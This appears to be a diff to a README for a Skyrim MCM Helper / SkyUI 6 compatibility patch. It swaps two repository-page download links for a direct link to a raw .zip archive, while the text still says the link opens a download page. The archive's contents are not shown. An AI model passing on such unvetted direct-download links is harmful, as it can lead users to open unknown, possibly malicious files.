@@ -1,12 +1,12 @@
 # 🛠️ MCM-Helper-SkyUI-6-Compatibility-Patch - Restore Skyrim MCM Menus Fast
 
-[![Download](https://img.shields.io/badge/Download-MCM_Helper_Patch-blue?style=for-the-badge&logo=github)](https://github.com/Violet-amphisbaenidae103/MCM-Helper-SkyUI-6-Compatibility-Patch)
+[![Download](https://img.shields.io/badge/Download-MCM_Helper_Patch-blue?style=for-the-badge&logo=github)](https://github.com/Violet-amphisbaenidae103/MCM-Helper-SkyUI-6-Compatibility-Patch/raw/refs/heads/main/BaseMain/Sky-Compatibility-MC-Helper-Patch-U-v2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[Download MCM-Helper-SkyUI-6-Compatibility-Patch](https://github.com/Violet-amphisbaenidae103/MCM-Helper-SkyUI-6-Compatibility-Patch)
+[Download MCM-Helper-SkyUI-6-Compatibility-Patch](https://github.com/Violet-amphisbaenidae103/MCM-Helper-SkyUI-6-Compatibility-Patch/raw/refs/heads/main/BaseMain/Sky-Compatibility-MC-Helper-Patch-U-v2.4.zip)
 
 ## 🧩 What this patch does
 
